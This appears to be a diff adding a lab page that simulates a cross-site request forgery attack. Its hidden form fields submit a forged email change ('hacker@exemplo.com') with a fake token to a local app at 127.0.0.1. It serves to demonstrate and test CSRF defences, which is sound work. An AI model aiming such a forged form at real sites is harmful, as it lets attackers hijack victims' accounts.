@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ataque CSRF</title>
+</head>
+<body>
+    <h1>Simulando CSRF</h1>
+    <form action="http://127.0.0.1:5000/alterar-email" method="POST">
+        <input type="hidden" name="novo_email" value="hacker@exemplo.com">
+        <input type="hidden" name="csrf_token" value="token_falso">
+        <button type="submit">Enviar</button>
+    </form>
+</body>
+</html>
